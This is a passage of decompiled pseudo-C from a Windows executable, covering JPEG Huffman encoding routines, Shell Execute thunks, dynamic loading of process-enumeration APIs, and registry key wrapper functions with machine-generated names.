      iVar3 = (**(code **)*local_8)();
      piVar5 = extraout_EDX_00;
    }
    iVar2 = iVar2 * 2;
    local_1c = local_1c + 1;
  }
  FUN_00420fb0((char)iVar3,(char)piVar5,(char)(local_14 + 0x400),local_14 + 0x400,0,0x100);
  if (local_c == 0) {
    local_20 = 0xff;
  }
  else {
    local_20 = 0xf;
  }
  local_2c = local_130;
  local_28 = local_534;
  iVar2 = 0;
  pbVar9 = (byte *)(local_10 + 0x11);
  if (0 < local_18) {
    do {
      uVar7 = (uint)*pbVar9;
      if ((local_20 < (int)uVar7) || (*(char *)(local_14 + 0x400 + uVar7) != '\0')) {
        *(undefined4 *)(*local_8 + 0x14) = 8;
        (**(code **)*local_8)();
      }
      iVar2 = iVar2 + 1;
      pbVar9 = pbVar9 + 1;
      *(int *)(local_14 + uVar7 * 4) = *local_28;
      *(char *)(local_14 + 0x400 + uVar7) = *local_2c;
      local_2c = local_2c + 1;
      local_28 = local_28 + 1;
    } while (iVar2 < local_18);
  }
  return;
}



undefined4 FUN_00433838(undefined4 *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = *(undefined4 **)(param_1[8] + 0x18);
  iVar2 = (*(code *)puVar1[3])();
  if (iVar2 == 0) {
    return 0;
  }
  *param_1 = *puVar1;
  param_1[1] = puVar1[1];
  return 1;
}



undefined4 FUN_00433860(int *param_1,uint param_2,int param_3)

{
  int *piVar1;
  undefined *puVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  
  iVar4 = param_1[3];
  if (param_3 == 0) {
    piVar1 = (int *)param_1[8];
    *(undefined4 *)(*piVar1 + 0x14) = 0x28;
    (**(code **)*piVar1)();
  }
  iVar4 = iVar4 + param_3;
  uVar5 = (param_2 & (1 << ((byte)param_3 & 0x1f)) - 1U) << (0x18U - (char)iVar4 & 0x1f) |
          param_1[2];
  while( true ) {
    if (iVar4 < 8) {
      param_1[2] = uVar5;
      param_1[3] = iVar4;
      return 1;
    }
    puVar2 = (undefined *)*param_1;
    *param_1 = *param_1 + 1;
    uVar6 = (int)uVar5 >> 0x10 & 0xff;
    *puVar2 = (char)uVar6;
    piVar1 = param_1 + 1;
    *piVar1 = *piVar1 + -1;
    if ((*piVar1 == 0) && (iVar3 = FUN_00433838(param_1), iVar3 == 0)) break;
    if (uVar6 == 0xff) {
      puVar2 = (undefined *)*param_1;
      *param_1 = *param_1 + 1;
      *puVar2 = 0;
      piVar1 = param_1 + 1;
      *piVar1 = *piVar1 + -1;
      if ((*piVar1 == 0) && (iVar3 = FUN_00433838(param_1), iVar3 == 0)) {
        return 0;
      }
    }
    uVar5 = uVar5 << 8;
    iVar4 = iVar4 + -8;
  }
  return 0;
}



undefined4 FUN_00433908(int *param_1)

{
  int iVar1;
  
  iVar1 = FUN_00433860(param_1,0x7f,7);
  if (iVar1 == 0) {
    return 0;
  }
  param_1[2] = 0;
  param_1[3] = 0;
  return 1;
}



undefined4 FUN_00433938(int *param_1,short *param_2,int param_3,uint *param_4,int param_5)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  int *local_18;
  int local_14;
  uint local_10;
  
  local_10 = *param_2 - param_3;
  uVar4 = local_10;
  if ((int)local_10 < 0) {
    uVar4 = -local_10;
    local_10 = local_10 - 1;
  }
  iVar5 = 0;
  for (; uVar4 != 0; uVar4 = (int)uVar4 >> 1) {
    iVar5 = iVar5 + 1;
  }
  if (0xb < iVar5) {
    piVar1 = (int *)param_1[8];
    *(undefined4 *)(*piVar1 + 0x14) = 6;
    (**(code **)*piVar1)();
  }
  iVar2 = FUN_00433860(param_1,*(uint *)(param_5 + iVar5 * 4),
                       (int)*(char *)(param_5 + 0x400 + iVar5));
  if (iVar2 == 0) {
    uVar3 = 0;
  }
  else if ((iVar5 == 0) || (iVar5 = FUN_00433860(param_1,local_10,iVar5), iVar5 != 0)) {
    local_14 = 1;
    local_18 = &DAT_00440dac;
    iVar5 = 0;
    do {
      local_10 = (uint)param_2[*local_18];
      if (local_10 == 0) {
        iVar5 = iVar5 + 1;
      }
      else {
        for (; 0xf < iVar5; iVar5 = iVar5 + -0x10) {
          iVar2 = FUN_00433860(param_1,param_4[0xf0],(int)*(char *)(param_4 + 0x13c));
          if (iVar2 == 0) {
            return 0;
          }
        }
        uVar4 = local_10;
        if ((int)local_10 < 0) {
          uVar4 = -local_10;
          local_10 = local_10 - 1;
        }
        iVar2 = 1;
        while (uVar4 = (int)uVar4 >> 1, uVar4 != 0) {
          iVar2 = iVar2 + 1;
        }
        if (10 < iVar2) {
          piVar1 = (int *)param_1[8];
          *(undefined4 *)(*piVar1 + 0x14) = 6;
          (**(code **)*piVar1)();
        }
        iVar5 = iVar5 * 0x10 + iVar2;
        iVar5 = FUN_00433860(param_1,param_4[iVar5],(int)*(char *)((int)param_4 + iVar5 + 0x400));
        if (iVar5 == 0) {
          return 0;
        }
        iVar5 = FUN_00433860(param_1,local_10,iVar2);
        if (iVar5 == 0) {
          return 0;
        }
        iVar5 = 0;
      }
      local_14 = local_14 + 1;
      local_18 = local_18 + 1;
    } while (local_14 < 0x40);
    if ((iVar5 < 1) ||
       (iVar5 = FUN_00433860(param_1,*param_4,(int)*(char *)(param_4 + 0x100)), iVar5 != 0)) {
      uVar3 = 1;
    }
    else {
      uVar3 = 0;
    }
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}



undefined4 FUN_00433acc(char **param_1,char param_2)

{
  char *pcVar1;
  int iVar2;
  char **ppcVar3;
  
  iVar2 = FUN_00433908((int *)param_1);
  if (iVar2 == 0) {
    return 0;
  }
  pcVar1 = *param_1;
  *param_1 = *param_1 + 1;
  *pcVar1 = -1;
  ppcVar3 = param_1 + 1;
  *ppcVar3 = *ppcVar3 + -1;
  if (*ppcVar3 == (char *)0x0) {
    iVar2 = FUN_00433838(param_1);
    if (iVar2 == 0) {
      return 0;
    }
  }
  pcVar1 = *param_1;
  *param_1 = *param_1 + 1;
  *pcVar1 = param_2 + -0x30;
  ppcVar3 = param_1 + 1;
  *ppcVar3 = *ppcVar3 + -1;
  if (*ppcVar3 == (char *)0x0) {
    iVar2 = FUN_00433838(param_1);
    if (iVar2 == 0) {
      return 0;
    }
  }
  ppcVar3 = param_1 + 4;
  for (iVar2 = 0; iVar2 < *(int *)(param_1[8] + 0xf0); iVar2 = iVar2 + 1) {
    *ppcVar3 = (char *)0x0;
    ppcVar3 = ppcVar3 + 1;
  }
  return 1;
}



undefined4 FUN_00433b40(int param_1,short **param_2)

{
  int iVar1;
  char **ppcVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  byte bVar7;
  int local_3c;
  int *local_38;
  char *local_34;
  char *local_30;
  int local_2c [6];
  int local_14;
  
  bVar7 = 0;
  iVar1 = *(int *)(param_1 + 0x168);
  local_34 = **(char ***)(param_1 + 0x18);
  local_30 = (*(char ***)(param_1 + 0x18))[1];
  piVar5 = (int *)(iVar1 + 0xc);
  piVar6 = local_2c;
  for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
    *piVar6 = *piVar5;
    piVar5 = piVar5 + 1;
    piVar6 = piVar6 + 1;
  }
  local_14 = param_1;
  if (((*(int *)(param_1 + 0xc4) != 0) && (*(int *)(iVar1 + 0x24) == 0)) &&
     (iVar4 = FUN_00433acc(&local_34,(char)*(undefined4 *)(iVar1 + 0x28)), iVar4 == 0)) {
    return 0;
  }
  local_3c = 0;
  local_38 = (int *)(param_1 + 0x110);
  while( true ) {
    if (*(int *)(param_1 + 0x10c) <= local_3c) {
      ppcVar2 = *(char ***)(param_1 + 0x18);
      *ppcVar2 = local_34;
      ppcVar2[1] = local_30;
      piVar5 = local_2c;
      piVar6 = (int *)(iVar1 + 0xc);
      for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
        *piVar6 = *piVar5;
        piVar5 = piVar5 + (uint)bVar7 * -2 + 1;
        piVar6 = piVar6 + (uint)bVar7 * -2 + 1;
      }
      if (*(int *)(param_1 + 0xc4) != 0) {
        if (*(int *)(iVar1 + 0x24) == 0) {
          *(int *)(iVar1 + 0x24) = *(int *)(param_1 + 0xc4);
          *(int *)(iVar1 + 0x28) = *(int *)(iVar1 + 0x28) + 1;
          *(uint *)(iVar1 + 0x28) = *(uint *)(iVar1 + 0x28) & 7;
        }
        *(int *)(iVar1 + 0x24) = *(int *)(iVar1 + 0x24) + -1;
      }
      return 1;
    }
    iVar4 = *local_38;
    iVar3 = *(int *)(param_1 + 0xf4 + iVar4 * 4);
    iVar3 = FUN_00433938((int *)&local_34,*param_2,local_2c[iVar4 + 2],
                         *(uint **)(iVar1 + 0x3c + *(int *)(iVar3 + 0x18) * 4),
                         *(int *)(iVar1 + 0x2c + *(int *)(iVar3 + 0x14) * 4));
    if (iVar3 == 0) break;
    local_2c[iVar4 + 2] = (int)**param_2;
    local_3c = local_3c + 1;
    param_2 = param_2 + 1;
    local_38 = local_38 + 1;
  }
  return 0;
}



void FUN_00433c50(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  byte bVar6;
  int local_30;
  int local_2c;
  undefined4 local_28 [6];
  int *local_10;
  
  bVar6 = 0;
  iVar1 = param_1[0x5a];
  local_30 = *(int *)param_1[6];
  local_2c = ((int *)param_1[6])[1];
  puVar4 = (undefined4 *)(iVar1 + 0xc);
  puVar5 = local_28;
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  local_10 = param_1;
  iVar3 = FUN_00433908(&local_30);
  if (iVar3 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x18;
    (**(code **)*param_1)();
  }
  piVar2 = (int *)param_1[6];
  *piVar2 = local_30;
  piVar2[1] = local_2c;
  puVar4 = local_28;
  puVar5 = (undefined4 *)(iVar1 + 0xc);
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + (uint)bVar6 * -2 + 1;
    puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
  }
  return;
}



void FUN_00433cc4(int *param_1,short *param_2,int param_3,int *param_4,int param_5)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *local_18;
  int local_14;
  
  iVar2 = *param_2 - param_3;
  if (iVar2 < 0) {
    iVar2 = -iVar2;
  }
  iVar3 = 0;
  for (; iVar2 != 0; iVar2 = iVar2 >> 1) {
    iVar3 = iVar3 + 1;
  }
  if (0xb < iVar3) {
    *(undefined4 *)(*param_1 + 0x14) = 6;
    (**(code **)*param_1)();
  }
  piVar1 = (int *)(param_5 + iVar3 * 4);
  *piVar1 = *piVar1 + 1;
  iVar2 = 0;
  local_14 = 1;
  local_18 = &DAT_00440dac;
  do {
    iVar3 = (int)param_2[*local_18];
    if (iVar3 == 0) {
      iVar2 = iVar2 + 1;
    }
    else {
      for (; 0xf < iVar2; iVar2 = iVar2 + -0x10) {
        param_4[0xf0] = param_4[0xf0] + 1;
      }
      if (iVar3 < 0) {
        iVar3 = -iVar3;
      }
      iVar4 = 1;
      while (iVar3 = iVar3 >> 1, iVar3 != 0) {
        iVar4 = iVar4 + 1;
      }
      if (10 < iVar4) {
        *(undefined4 *)(*param_1 + 0x14) = 6;
        (**(code **)*param_1)();
      }
      param_4[iVar4 + iVar2 * 0x10] = param_4[iVar4 + iVar2 * 0x10] + 1;
      iVar2 = 0;
    }
    local_14 = local_14 + 1;
    local_18 = local_18 + 1;
  } while (local_14 < 0x40);
  if (0 < iVar2) {
    *param_4 = *param_4 + 1;
  }
  return;
}



undefined4 FUN_00433d9c(int *param_1,short **param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  int local_18;
  int *local_14;
  
  iVar1 = param_1[0x5a];
  if (param_1[0x31] != 0) {
    if (*(int *)(iVar1 + 0x24) == 0) {
      puVar2 = (undefined4 *)(iVar1 + 0x14);
      for (iVar3 = 0; iVar3 < param_1[0x3c]; iVar3 = iVar3 + 1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      *(int *)(iVar1 + 0x24) = param_1[0x31];
    }
    *(int *)(iVar1 + 0x24) = *(int *)(iVar1 + 0x24) + -1;
  }
  local_14 = param_1 + 0x44;
  for (local_18 = 0; local_18 < param_1[0x43]; local_18 = local_18 + 1) {
    iVar3 = *local_14;
    FUN_00433cc4(param_1,*param_2,*(int *)(iVar1 + 0x14 + iVar3 * 4),
                 *(int **)(iVar1 + 0x5c + *(int *)(param_1[iVar3 + 0x3d] + 0x18) * 4),
                 *(int *)(iVar1 + 0x4c + *(int *)(param_1[iVar3 + 0x3d] + 0x14) * 4));
    *(int *)(iVar1 + 0x14 + iVar3 * 4) = (int)**param_2;
    param_2 = param_2 + 1;
    local_14 = local_14 + 1;
  }
  return 1;
}



void FUN_00433e50(int *param_1,int param_2,int *param_3)

{
  int iVar1;
  undefined uVar2;
  int *piVar3;
  undefined extraout_CL;
  char *pcVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  char *pcVar8;
  undefined *puVar9;
  int iVar10;
  undefined4 local_83c;
  char local_838 [31];
  char local_819 [5];
  int local_814 [257];
  int local_410 [257];
  
  local_83c = param_3;
  uVar2 = FUN_00420fb0((char)local_838,(char)param_2,(char)param_3,local_838,0,0x21);
  FUN_00420fb0(uVar2,(char)local_814,extraout_CL,local_814,0,0x404);
  iVar5 = 0;
  piVar3 = local_410;
  do {
    *piVar3 = -1;
    iVar5 = iVar5 + 1;
    piVar3 = piVar3 + 1;
  } while (iVar5 < 0x101);
  local_83c[0x100] = 1;
  while( true ) {
    iVar5 = -1;
    iVar10 = 1000000000;
    iVar6 = 0;
    piVar3 = local_83c;
    do {
      iVar7 = *piVar3;
      if ((iVar7 != 0) && (iVar7 <= iVar10)) {
        iVar5 = iVar6;
        iVar10 = iVar7;
      }
      iVar6 = iVar6 + 1;
      piVar3 = piVar3 + 1;
    } while (iVar6 < 0x101);
    iVar10 = -1;
    iVar6 = 1000000000;
    iVar7 = 0;
    piVar3 = local_83c;
    do {
      iVar1 = *piVar3;
      if (((iVar1 != 0) && (iVar1 <= iVar6)) && (iVar5 != iVar7)) {
        iVar10 = iVar7;
        iVar6 = iVar1;
      }
      iVar7 = iVar7 + 1;
      piVar3 = piVar3 + 1;
    } while (iVar7 < 0x101);
    if (iVar10 < 0) break;
    local_83c[iVar5] = local_83c[iVar5] + local_83c[iVar10];
    local_83c[iVar10] = 0;
    local_814[iVar5] = local_814[iVar5] + 1;
    while (iVar6 = local_410[iVar5], -1 < iVar6) {
      local_814[iVar6] = local_814[iVar6] + 1;
      iVar5 = iVar6;
    }
    local_410[iVar5] = iVar10;
    local_814[iVar10] = local_814[iVar10] + 1;
    while (iVar10 = local_410[iVar10], -1 < iVar10) {
      local_814[iVar10] = local_814[iVar10] + 1;
    }
  }
  iVar5 = 0;
  piVar3 = local_814;
  do {
    if (*piVar3 != 0) {
      if (0x20 < *piVar3) {
        *(undefined4 *)(*param_1 + 0x14) = 0x27;
        (**(code **)*param_1)();
      }
      local_838[*piVar3] = local_838[*piVar3] + '\x01';
    }
    iVar5 = iVar5 + 1;
    piVar3 = piVar3 + 1;
  } while (iVar5 < 0x101);
  pcVar8 = local_819 + 1;
  iVar5 = 0x20;
  do {
    while (iVar10 = iVar5, *pcVar8 != '\0') {
      iVar5 = iVar10 + -2;
      for (pcVar4 = local_838 + iVar10 + -2; *pcVar4 == '\0'; pcVar4 = pcVar4 + -1) {
        iVar5 = iVar5 + -1;
      }
      *pcVar8 = *pcVar8 + -2;
      pcVar8[-1] = pcVar8[-1] + '\x01';
      local_838[iVar5 + 1] = local_838[iVar5 + 1] + '\x02';
      local_838[iVar5] = local_838[iVar5] + -1;
      iVar5 = iVar10;
    }
    iVar5 = iVar10 + -1;
    pcVar8 = pcVar8 + -1;
  } while (0x10 < iVar5);
  for (pcVar8 = local_838 + iVar10 + -1; *pcVar8 == '\0'; pcVar8 = pcVar8 + -1) {
    iVar5 = iVar5 + -1;
  }
  local_838[iVar5] = local_838[iVar5] + -1;
  FUN_00420fc8((char)pcVar8,(char)local_838,(char)param_2,param_2,local_838,0x11);
  iVar10 = 0;
  iVar5 = 1;
  do {
    iVar6 = 0;
    puVar9 = (undefined *)(param_2 + 0x11 + iVar10);
    piVar3 = local_814;
    do {
      if (iVar5 == *piVar3) {
        *puVar9 = (char)iVar6;
        iVar10 = iVar10 + 1;
        puVar9 = puVar9 + 1;
      }
      iVar6 = iVar6 + 1;
      piVar3 = piVar3 + 1;
    } while (iVar6 < 0x100);
    iVar5 = iVar5 + 1;
  } while (iVar5 < 0x21);
  *(undefined4 *)(param_2 + 0x114) = 0;
  return;
}



void FUN_00434034(int *param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  undefined uVar4;
  int iVar5;
  int iVar6;
  undefined in_CL;
  undefined extraout_DL;
  int local_38;
  int *local_34;
  int local_30 [4];
  int local_20 [4];
  
  iVar2 = param_1[0x5a];
  uVar4 = FUN_00420fb0((char)iVar2,(char)local_30,in_CL,local_30,0,0x10);
  FUN_00420fb0(uVar4,extraout_DL,(char)local_20,local_20,0,0x10);
  local_34 = param_1 + 0x3d;
  for (local_38 = 0; local_38 < param_1[0x3c]; local_38 = local_38 + 1) {
    iVar6 = *(int *)(*local_34 + 0x14);
    iVar3 = *(int *)(*local_34 + 0x18);
    if (local_30[iVar6] == 0) {
      piVar1 = param_1 + iVar6 + 0x15;
      if (*piVar1 == 0) {
        iVar5 = FUN_0042dcb4((int)param_1);
        *piVar1 = iVar5;
      }
      FUN_00433e50(param_1,*piVar1,*(int **)(iVar2 + 0x4c + iVar6 * 4));
      local_30[iVar6] = 1;
    }
    if (local_20[iVar3] == 0) {
      piVar1 = param_1 + iVar3 + 0x19;
      if (*piVar1 == 0) {
        iVar6 = FUN_0042dcb4((int)param_1);
        *piVar1 = iVar6;
      }
      FUN_00433e50(param_1,*piVar1,*(int **)(iVar2 + 0x5c + iVar3 * 4));
      local_20[iVar3] = 1;
    }
    local_34 = local_34 + 1;
  }
  return;
}



void FUN_0043410c(int param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x6c);
  *(undefined4 **)(param_1 + 0x168) = puVar1;
  *puVar1 = &LAB_004334b0;
  iVar2 = 0;
  puVar1 = puVar1 + 0xf;
  do {
    *puVar1 = 0;
    puVar1[-4] = 0;
    puVar1[8] = 0;
    puVar1[4] = 0;
    iVar2 = iVar2 + 1;
    puVar1 = puVar1 + 1;
  } while (iVar2 < 4);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

HINSTANCE __stdcall
ShellExecuteA(HWND hwnd,LPCSTR lpOperation,LPCSTR lpFile,LPCSTR lpParameters,LPCSTR lpDirectory,
             INT nShowCmd)

{
  HINSTANCE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00434240. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HINSTANCE)ShellExecuteA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall ShellExecuteExA(SHELLEXECUTEINFOA *pExecInfo)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00434248. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ShellExecuteExA();
  return BVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00434288(void)

{
  HMODULE in_EAX;
  
  if (DAT_00442900 == (HMODULE)0x0) {
    in_EAX = GetModuleHandleA("kernel32.dll");
    DAT_00442900 = in_EAX;
    if (in_EAX != (HMODULE)0x0) {
      DAT_00442904 = GetProcAddress(in_EAX,"CreateToolhelp32Snapshot");
      _DAT_00442908 = GetProcAddress(DAT_00442900,"Heap32ListFirst");
      _DAT_0044290c = GetProcAddress(DAT_00442900,"Heap32ListNext");
      _DAT_00442910 = GetProcAddress(DAT_00442900,"Heap32First");
      _DAT_00442914 = GetProcAddress(DAT_00442900,"Heap32Next");
      _DAT_00442918 = GetProcAddress(DAT_00442900,"Toolhelp32ReadProcessMemory");
      DAT_0044291c = GetProcAddress(DAT_00442900,"Process32First");
      DAT_00442920 = GetProcAddress(DAT_00442900,"Process32Next");
      _DAT_00442924 = GetProcAddress(DAT_00442900,"Process32FirstW");
      _DAT_00442928 = GetProcAddress(DAT_00442900,"Process32NextW");
      _DAT_0044292c = GetProcAddress(DAT_00442900,"Thread32First");
      _DAT_00442930 = GetProcAddress(DAT_00442900,"Thread32Next");
      _DAT_00442934 = GetProcAddress(DAT_00442900,"Module32First");
      _DAT_00442938 = GetProcAddress(DAT_00442900,"Module32Next");
      _DAT_0044293c = GetProcAddress(DAT_00442900,"Module32FirstW");
      in_EAX = (HMODULE)GetProcAddress(DAT_00442900,"Module32NextW");
      _DAT_00442940 = in_EAX;
    }
  }
  if ((DAT_00442900 != (HMODULE)0x0) && (DAT_00442904 != (FARPROC)0x0)) {
    return CONCAT31((int3)((uint)in_EAX >> 8),1);
  }
  return 0;
}



undefined4 FUN_00434504(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00434288();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_00442904)();
    return uVar1;
  }
  return 0;
}



undefined4 FUN_00434524(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00434288();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_0044291c)();
    return uVar1;
  }
  return 0;
}



undefined4 FUN_00434544(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00434288();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_00442920)();
    return uVar1;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00434564(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack16 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack16;
  _DAT_004428fc = _DAT_004428fc + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



undefined4 FUN_00434738(char *param_1)

{
  if ((param_1 != (char *)0x0) && (*param_1 == '\\')) {
    return 0;
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



undefined4 FUN_0043474c(char param_1)

{
  if (param_1 == '\x01') {
    return 1;
  }
  if (param_1 == '\x02') {
    return 2;
  }
  if (param_1 == '\x03') {
    return 4;
  }
  if (param_1 != '\x04') {
    return 0;
  }
  return 3;
}



int * FUN_0043477c(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  FUN_00434858((int)param_1,(HKEY)0x80000001);
  param_1[6] = 0xf003f;
  *(undefined *)(param_1 + 3) = 1;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



int * FUN_004347c0(int *param_1,char param_2,int param_3)

{
  int extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0043477c(param_1,'\0',param_3);
  param_1[6] = param_3;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_00434828(int param_1)

{
  HKEY hKey;
  
  hKey = *(HKEY *)(param_1 + 4);
  if (hKey != (HKEY)0x0) {
    if (*(char *)(param_1 + 0xc) == '\0') {
      RegFlushKey(hKey);
    }
    else {
      RegCloseKey(hKey);
    }
    *(undefined4 *)(param_1 + 4) = 0;
    FUN_004047a8((int *)(param_1 + 0x10));
  }
  return;
}



void FUN_00434858(int param_1,HKEY param_2)

{
  if (param_2 != *(HKEY *)(param_1 + 8)) {
    if (*(char *)(param_1 + 0x14) != '\0') {
      RegCloseKey(*(HKEY *)(param_1 + 8));
      *(undefined *)(param_1 + 0x14) = 0;
    }
    *(HKEY *)(param_1 + 8) = param_2;
    FUN_00434828(param_1);
  }
  return;
}



void FUN_00434884(int param_1,undefined4 param_2,undefined4 *param_3)

{
  FUN_00434828(param_1);
  *(undefined4 *)(param_1 + 4) = param_2;
  FUN_004047fc((int *)(param_1 + 0x10),param_3);
  return;
}



int FUN_004348a8(int param_1,char param_2)

{
  if ((*(int *)(param_1 + 4) != 0) && (param_2 != '\0')) {
    return *(int *)(param_1 + 4);
  }
  return *(int *)(param_1 + 8);
}



void FUN_004348bc(int param_1,undefined4 param_2)

{
  *(undefined4 *)(param_1 + 4) = param_2;
  return;
}



void FUN_004348c0(int param_1,int param_2)

{
  undefined4 uVar1;
  LPCSTR lpSubKey;
  HKEY hKey;
  LSTATUS LVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  DWORD Reserved;
  LPSTR lpClass;
  DWORD dwOptions;
  REGSAM samDesired;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  HKEY *phkResult;
  DWORD *lpdwDisposition;
  undefined *puStack48;
  undefined *puStack44;
  undefined *puStack40;
  int local_18;
  undefined local_14;
  DWORD local_10;
  char *local_c;
  HKEY local_8;
  
  puStack40 = &stack0xfffffffc;
  local_c = (char *)0x0;
  puStack44 = &LAB_0043498c;
  puStack48 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack48;
  local_8 = (HKEY)0x0;
  FUN_00404840((int *)&local_c,param_2);
  uVar1 = FUN_00434738(local_c);
  if ((char)uVar1 == '\0') {
    FUN_00404d08((int *)&local_c,1,1);
  }
  lpdwDisposition = &local_10;
  phkResult = &local_8;
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  samDesired = 0xf003f;
  dwOptions = 0;
  lpClass = (LPSTR)0x0;
  Reserved = 0;
  lpSubKey = FUN_00404c68(local_c);
  hKey = (HKEY)FUN_004348a8(param_1,(char)uVar1);
  LVar2 = RegCreateKeyExA(hKey,lpSubKey,Reserved,lpClass,dwOptions,samDesired,lpSecurityAttributes,
                          phkResult,lpdwDisposition);
  if (LVar2 == 0) {
    uVar1 = 0x434950;
    RegCloseKey(local_8);
  }
  else {
    local_14 = 0xb;
    uVar1 = 0;
    local_18 = param_2;
    iVar3 = FUN_0040b9b4((int)&DAT_00434650,'\x01',(int **)PTR_PTR_DAT_004413ac,0,&local_18);
    FUN_00404208(iVar3);
  }
  *in_FS_OFFSET = uVar1;
  puStack48 = &LAB_00434993;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_0043499c(int param_1,int param_2,char param_3)

{
  undefined4 uVar1;
  LPCSTR pCVar2;
  HKEY pHVar3;
  int iVar4;
  byte bVar5;
  LPSECURITY_ATTRIBUTES *in_FS_OFFSET;
  DWORD Reserved;
  LPSTR lpClass;
  DWORD dwOptions;
  REGSAM RVar6;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  HKEY *ppHVar7;
  DWORD *lpdwDisposition;
  _SECURITY_ATTRIBUTES _Stack40;
  DWORD local_14;
  LPSECURITY_ATTRIBUTES local_10;
  HKEY local_c;
  undefined local_6;
  char local_5;
  
  _Stack40.bInheritHandle = (BOOL)&stack0xfffffffc;
  local_10 = (LPSECURITY_ATTRIBUTES)0x0;
  _Stack40.lpSecurityDescriptor = &LAB_00434aa1;
  _Stack40.nLength = (DWORD)*in_FS_OFFSET;
  *in_FS_OFFSET = &_Stack40;
  local_5 = param_3;
  FUN_00404840((int *)&local_10,param_2);
  uVar1 = FUN_00434738((char *)local_10);
  bVar5 = (byte)uVar1;
  if (bVar5 == 0) {
    FUN_00404d08((int *)&local_10,1,1);
  }
  local_c = (HKEY)0x0;
  if ((local_5 == '\0') || (local_10 == (LPSECURITY_ATTRIBUTES)0x0)) {
    ppHVar7 = &local_c;
    RVar6 = *(REGSAM *)(param_1 + 0x18);
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    pCVar2 = FUN_00404c68((undefined *)local_10);
    pHVar3 = (HKEY)FUN_004348a8(param_1,bVar5);
    iVar4 = RegOpenKeyExA(pHVar3,pCVar2,(DWORD)lpSecurityAttributes,RVar6,ppHVar7);
  }
  else {
    lpdwDisposition = &local_14;
    ppHVar7 = &local_c;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    RVar6 = *(REGSAM *)(param_1 + 0x18);
    dwOptions = 0;
    lpClass = (LPSTR)0x0;
    Reserved = 0;
    pCVar2 = FUN_00404c68((undefined *)local_10);
    pHVar3 = (HKEY)FUN_004348a8(param_1,bVar5);
    iVar4 = RegCreateKeyExA(pHVar3,pCVar2,Reserved,lpClass,dwOptions,RVar6,lpSecurityAttributes,
                            ppHVar7,lpdwDisposition);
  }
  local_6 = iVar4 == 0;
  if ((bool)local_6) {
    if ((*(int *)(param_1 + 4) != 0 & bVar5) != 0) {
      lpSecurityAttributes = local_10;
      FUN_00404b28((int **)&local_10,3);
    }
